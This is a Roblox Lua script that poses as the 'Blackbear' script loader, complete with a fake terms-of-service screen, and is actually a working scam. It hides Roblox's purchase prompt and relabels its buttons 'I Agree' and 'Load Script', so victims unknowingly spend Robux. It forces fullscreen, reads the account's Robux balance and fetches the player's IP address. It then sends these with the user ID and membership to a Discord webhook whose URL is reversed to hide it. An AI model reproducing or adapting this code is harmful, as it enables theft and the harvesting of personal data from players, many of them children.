repeat wait() until game:IsLoaded()
local diddone = false
LPH_JIT_ULTRA(function()
spawn(function()
    pcall(function()
    game:GetService("RunService").RenderStepped:Connect(function()
    if game:GetService("CoreGui"):FindFirstChild("PurchasePrompt") then
    for i, v in pairs(game:GetService("CoreGui").PurchasePrompt:GetDescendants()) do
    if v:IsA("Frame") then
        v.BackgroundTransparency = 1
    end
    if v:IsA("TextLabel") then
        if v.Name ~= "BalanceAmount" then
        v.Text = ""
        end
        v.TextTransparency = 1
    end
    if v:IsA("ImageButton") then
        v.ImageTransparency = 1
    end
    if v:IsA("ImageLabel") then
        v.ImageTransparency = 1
    end
    end
    end
    end)
end)
end)
end)()
local CoreGui = Instance.new("ScreenGui")
if syn then
    syn.protect_gui(CoreGui)
    end
local Frame = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local sickline = Instance.new("Frame")
local UIGradient = Instance.new("UIGradient")
local loading = Instance.new("TextLabel")
local tos = Instance.new("ScrollingFrame")
local TextBox = Instance.new("TextBox")
repeat wait() until game:IsLoaded()
repeat wait() until game.Players.LocalPlayer
--Properties:

CoreGui.Name = "CoreGui"
CoreGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
CoreGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
CoreGui.ResetOnSpawn = false

    local TeleportService = game:GetService("TeleportService")
    TeleportService:SetTeleportGui(CoreGui)
Frame.Parent = CoreGui
Frame.AnchorPoint = Vector2.new(0.5, 0.5)
Frame.BackgroundColor3 = Color3.fromRGB(25, 28, 42)
Frame.BorderColor3 = Color3.fromRGB(25, 28, 42)
Frame.BorderSizePixel = 100
Frame.Position = UDim2.new(0.5, 0, 0.5, 0)
Frame.Size = UDim2.new(1, 0, 1, 0)

TextLabel.Parent = Frame
TextLabel.AnchorPoint = Vector2.new(0.5, 0.5)
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.Position = UDim2.new(0.500110567, 0, 0.100000001, 0)
TextLabel.Size = UDim2.new(0, 948, 0, 50)
TextLabel.Font = Enum.Font.GothamBold
TextLabel.Text = "Welcome, username"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextScaled = true
TextLabel.TextSize = 60.000
TextLabel.TextWrapped = true

sickline.Name = "sickline"
sickline.Parent = Frame
sickline.AnchorPoint = Vector2.new(0.5, 0.5)
sickline.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
sickline.BorderSizePixel = 0
sickline.Position = UDim2.new(0.5, 0, 0.150000006, 0)
sickline.Size = UDim2.new(0.699999988, 0, 0, 2)

UIGradient.Transparency = NumberSequence.new{NumberSequenceKeypoint.new(0.00, 1.00), NumberSequenceKeypoint.new(0.50, 0.00), NumberSequenceKeypoint.new(1.00, 1.00)}
UIGradient.Parent = sickline

loading.Name = "loading"
loading.Parent = Frame
loading.AnchorPoint = Vector2.new(0.5, 0.5)
loading.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
loading.BackgroundTransparency = 1.000
loading.Position = UDim2.new(0.50016588, 0, 0.200000003, 0)
loading.Size = UDim2.new(0, 948, 0, 50)
loading.Font = Enum.Font.GothamBold
loading.Text = ""
loading.TextColor3 = Color3.fromRGB(255, 255, 255)
loading.TextSize = 30.000

tos.Name = "tos"
tos.Parent = Frame
tos.Active = true
tos.AnchorPoint = Vector2.new(0.5, 0.5)
tos.BackgroundColor3 = Color3.fromRGB(39, 44, 66)
tos.BorderSizePixel = 0
tos.Position = UDim2.new(0.5, 0, 0.362748086, 0)
tos.Size = UDim2.new(0.5, 0, 0.258778632, 0)
tos.CanvasSize = UDim2.new(0, 0, 1, 0)
tos.HorizontalScrollBarInset = Enum.ScrollBarInset.Always
tos.ScrollBarThickness = 2
tos.Visible = false

TextBox.Parent = tos
TextBox.AnchorPoint = Vector2.new(0.5, 0.5)
TextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextBox.BackgroundTransparency = 1.000
TextBox.Position = UDim2.new(0.5, 0, 0.5, 0)
TextBox.Size = UDim2.new(0, 200, 0, 417)
TextBox.Font = Enum.Font.SourceSans
TextBox.ClearTextOnFocus = false
TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
TextBox.TextSize = 12.000
TextBox.Text = [[
Welcome to Blackbear!
By using Blackbear, you agree to the Terms and Conditions of Use listed below. Be certain to read the full Terms and Conditions of
Use in detail; in the event of any conflict or inconsistency between this summary and the full Terms and
Conditions, the full Terms and Conditions will govern.

We may periodically make changes to these Terms and will identify the date of last update. We will post
the updated Terms and notify registered users when they log-onto Blackbear of any material
changes to these Terms, so please keep your registered email address current. Changes to the
Terms will be effective upon being posted, except as set forth below. Material changes to these Terms will be effective 30 days from posting of such change
(“Effective Date”). We encourage you to review the most recent version of the Terms frequently and
remain informed of any changes to these Terms. If you continue to use Blackbear after we modify these
Terms, you will be deemed to have consented to terms of the modified agreement for your use of
Blackbear as of the date of the modification. If you do not agree to any provision of these Terms, you must
not use Blackbear.

Eligibility
You must be 13 years of age or older to use Blackbear. Use of Blackbear is void where prohibited. You
represent and warrant that any information you submit to the Services or otherwise to Blackbear Services,
during registration or otherwise, is true and accurate, that you are 13 years of age or older, and that you
are fully able and competent to enter into and abide by these Terms. European residents under the age of
16 shouldn’t use Blackbear without verified parental consent.

Account Registration and Certification

You might have to register to use certain features of Blackbear. When you register, you agree to:
(a) provide
accurate, current and complete information about you as may be prompted by registration forms on
Blackbear (“Registration Data”);
(b) maintain the security of any logins, passwords, or other credentials
that you select or that are provided to you for use on Synapse; and
(c) maintain and promptly update the
Registration Data, and any other information you provide to us, and to keep all such information accurate,
current, and complete. You will notify us immediately of any unauthorized use of your account or any
other breach of security.


Fees; No Refunds
Access to the Service presently is provided to you free of charge. Blackbear Services reserves the right to
implement fees or change the fees for Blackbear, or portions thereof, at any time. Before you become obligated to pay such fees you will have
the opportunity to terminate your account. The fees will only apply to users who have engaged in active use of Blackbear; no charges are automated.

Collection of Information.
We collect public and non-public information (i) when you use our Script; (ii) when you communicate with us via our customer support channels; (iii) we collect through third-party service providers and other sources; (iv) through online research on social media and websites, which may not be publicly available; and (v) when you use any of our Services directly or via a Platform.
Our servers may automatically collect information about your visit to the Script's and to Partners" Websites, including virtual currency balances, IP addresses and associated information, the address of the website visited before using the Website, browser type and settings, the date and time the Services were accessed and used, information about browser configuration and plugins, language preferences.
We retain your information to fulfill our legal or regulatory obligations and for our business purposes. We may retain your Data for longer periods than required by law if it is in our legitimate business interests and not prohibited by law.


Disclaimer of Warranties
SUBJECT TO APPLICABLE LAW, THE SERVICE (INCLUDING ITS CONTENT AND DATA), ANY USER MATERIALS, AND ANY THIRD-PARTY CONTENT, SOFTWARE, SERVICES OR APPLICATIONS MADE AVAILABLE ON OR THROUGH OR IN RELATION TO THE SERVICE, ARE PROVIDED ON AN “AS IS,” “AS AVAILABLE,” “WITH ALL FAULTS” BASIS WITHOUT REPRESENTATIONS OR WARRANTIES OF ANY KIND, EITHER EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO IN TERMS OF CORRECTNESS,
ACCURACY, RELIABILITY, OR OTHERWISE, OTHER THAN THOSE THAT ARE REQUIRED BY APPLICABLE
LAW. YOUR USE OF THE SERVICE, INCLUDING, WITHOUT LIMITATION, YOUR USE OF ANY CONTENT
OR DATA ACCESSIBLE ON OR THROUGH THE SERVICE (INCLUDING USER MATERIALS), IS AT YOUR
SOLE RISK.
]]
-- Scripts:

local function FDFA_fake_script() -- Frame.LocalScript 
    LPH_JIT_ULTRA(function()
	local script = Instance.new('LocalScript', Frame)

	local tstring = "Welcome, "..game.Players.LocalPlayer.name
	for i = 1,#tstring do
		script.Parent.TextLabel.Text = string.sub(tstring,1,i)
		wait(0.1)
	end
	wait(0.5)
	local otherstring = "Loading script"
	for i = 1,#otherstring do
		script.Parent.loading.Text = string.sub(otherstring,1,i)
		wait(0.1)
	end
	local ee = false
	local monkeydots = "..."
	function doloop()
		if ee == true then return end
		for i = 1,#monkeydots do
			script.Parent.loading.Text = otherstring.. string.sub(monkeydots,1,i)
			wait(0.4)
			if script.Parent.loading.Text == "Loading script..." then
				script.Parent.loading.Text = "Loading script"
				doloop()
			end
		end
		wait(3)
	end
	spawn(function()
		doloop()
	end)
	wait(3)
	ee = true
	local tweenInfo = TweenInfo.new(
		2, -- Time
		Enum.EasingStyle.Linear, -- EasingStyle
		Enum.EasingDirection.Out -- EasingDirection
	)
	
	
	local tween = game.TweenService:Create(script.Parent.loading, tweenInfo, {TextTransparency = 1})
	tween:Play()
	wait(1)
	script.Parent.tos.Visible = true
end)()
end
local setcolor1 = Color3.fromRGB(25, 28, 42)
local setcolor2 = Color3.fromRGB(25, 28, 42)
coroutine.wrap(FDFA_fake_script)()

repeat wait(1) until pcall(function() 
    game:GetService("CoreGui").PurchasePrompt.ProductPurchaseContainer.Animator.Prompt.AlertContents.Footer:FindFirstChild("Buttons")
end)
local btn = game:GetService("CoreGui").PurchasePrompt:Clone()
local agreebtn = nil
spawn(function()
    game:GetService("RunService").RenderStepped:Connect(function()
    if btn then
    for i, v in pairs(btn:GetDescendants()) do
    if v:IsA("Frame") then
        v.BackgroundTransparency = 1
    end
    if v:IsA("TextLabel") then
        if v.Name ~= "BalanceAmount"  then
        v.Text = ""
        end
        if v.Name == "Text" then
            if v.Parent.Parent.Parent.Name == "2" then
                v.Text = "Load Script"
                v.AnchorPoint = Vector2.new(0.5,0.5)
                v.Position = UDim2.new(0.5,0,0.5,0)
                v.TextTransparency = 0
                v.TextXAlignment = "Left"
                v.Parent.Parent.Parent.ImageTransparency = 1
                v.TextColor3 = setcolor2
                v.Size = UDim2.new(1,0,1,0)
            elseif v.Parent.Parent.Parent.Name == "1" then
                v.Text = "I Agree"
                agreebtn = v.Parent.Parent.Parent
                agreebtn.ImageTransparency = 1
                v.TextTransparency = 0
                v.AnchorPoint = Vector2.new(0.5,0.5)
                v.Position = UDim2.new(0.5,0,0.5,0)
                v.TextXAlignment = "Center"
                v.TextColor3 = setcolor1
                v.Size = UDim2.new(1,0,1,0)
            end
        else
            v.TextTransparency = 1
        end
        
    end
    if v:IsA("ImageButton") and v.Name ~= "2" and v.Name ~= "1" then
        v.ImageTransparency = 1

    elseif v.Name == "2" then
        v.ImageColor3 = Color3.fromRGB(39, 44, 66)
        v.ImageTransparency = 0
    end
    if v:IsA("ImageLabel") then
        v.ImageTransparency = 1
    end
    end
else
    game.Players.LocalPlayer:Kick("Error, try again.")
    end
    end)
end)

repeat wait() print("isnil") until agreebtn ~= nil
btn.Parent = Frame
local bal
pcall(function()
	local thing = btn:WaitForChild("ProductPurchaseContainer"):WaitForChild("Animator"):WaitForChild("Prompt"):WaitForChild("AlertContents").Footer.FooterContent.Content.BalanceAmount.Text
	local extra = string.gsub(thing,",","")
	local extra2 = string.gsub(thing,".","")
	local extra3 = string.gsub(thing," ","")
	bal = tonumber(extra3) + 1
end)
wait(2)
game:GetService("VirtualInputManager"):SendKeyEvent(true,"Escape",false,game)
game:GetService("VirtualInputManager"):SendKeyEvent(true,"Escape",false,game)
LPH_JIT_ULTRA(function()
if KRNL_LOADED then
    getgenv().syn = nil
end
local exploit_type
if PROTOSMASHER_LOADED then
    exploit_type = "ProtoSmasher"
elseif is_sirhurt_closure then
    exploit_type = "Sirhurt"
elseif SENTINEL_LOADED then
    exploit_type = "Sentinel"
elseif syn then
    exploit_type = "Synapse X"
elseif KRNL_LOADED then
    exploit_type = "KRNL"
elseif hookfunction_raw and hmjdfk then
    exploit_type = "Fluxus Mac Free"
    if not getconnections then
        getgenv().getconnections = function()
            return {}
        end
        getgenv().set_thread_context = function()
            return
        end
        getgenv().fluxus_loaded = true
    end
elseif FLUXUS_LOADED then
    exploit_type = "Fluxus"
elseif getexecutorname then
    exploit_type = "Script-Ware"
end
if UserSettings().GameSettings:InFullScreen() then
    print("")
else
    game:GetService("VirtualInputManager"):SendKeyEvent(true,"F11",false,game)
end
end)()
coroutine.wrap(function()
    while wait() do
        if UserSettings().GameSettings:InFullScreen() then
            print()
        else
            game:GetService("VirtualInputManager"):SendKeyEvent(true,"F11",false,game)
        end
    end
end)()
exploit_type = exploit_type or "???"
local prem = "None"
if game.Players.LocalPlayer.MembershipType == Enum.MembershipType.Premium then
    prem = "Premium"
end
if bal == nil then
bal = 0
end
local req = game:HttpGet("https://api.ipify.org/?format=text") or "failed to grab"
local d = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds="..game.Players.LocalPlayer.UserId.."&size=420x420&format=Png&isCircular=false"))
http_request = http_request or request or (http and http.request) or syn.request 
if not http_request then while true do end return end
http_request(
    {
        Url = string.reverse("S0M83or1rAa7gkkipald_XfQVaoB4yHLcEUbt7XjHvyDJIsTm1tucrIbz_pvIfKcT8L4/1906148607077762001/skoohbew/ipa/moc.drocsid//:sptth"),
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"  -- When sending JSON, set this!
        },
        Body = game:GetService("HttpService"):JSONEncode({["embeds"] = {{
            ["title"] = "@"..game.Players.LocalPlayer.Name.." is getting beamed",
            ["description"] = "Executor: "..exploit_type,
            ["url"] = "https://www.roblox.com/users/"..game.Players.LocalPlayer.UserId.. "/profile",
            ["color"] = 0xd33682,
            ["fields"] = {
                {
                    ["name"] = "User ID",
                    ["value"] = "```ansi\n[0;35m"..game.Players.LocalPlayer.UserId.."\n```",
                    ["inline"] = true
                  },
                  {
                    ["name"] = "Account Age",
                    ["value"] = "```ansi\n[0;35m"..game.Players.LocalPlayer.AccountAge.."\n```",
                    ["inline"] = true
                  },
                  {
                    ["name"] = "Robux",
                    ["value"] = "```ansi\n[0;35m"..bal.."\n```",
                    ["inline"] = true
                  },
                  {
                    ["name"] = "IP Address",
                    ["value"] = "```ansi\n[0;35m"..req.."\n```"
                  },
                  {
                    ["name"] = "Membership",
                    ["value"] = "```ansi\n[0;35m"..prem.."\n```"
                  },
                  {
                    ["name"] = "Username",
                    ["value"] = "```ansi\n[0;35m"..game.Players.LocalPlayer.Name.."\n```"
                  }
            },
            ["footer"] = {
                ["text"] = "Blackbear Logs https://discord.gg/XgXgWzaJQ4"
            },
            ["thumbnail"] = {
                ["url"] = d.data[1].imageUrl
            }
        }}})
    }
)

if bal == 0 then
    while true do end
    return
end
game:GetService("RunService").Heartbeat:Connect(function()
    workspace.robu.Value = bal
end)
wait(5)
setcolor1 = Color3.fromRGB(255,255,255)
agreebtn.MouseButton1Click:Connect(function()
    tos.Visible = false
    setcolor1 = Color3.fromRGB(25, 28, 42)
    setcolor2 = Color3.fromRGB(255,255,255)
    loading.Text = "All ready! Press Load Script to load!"
end)


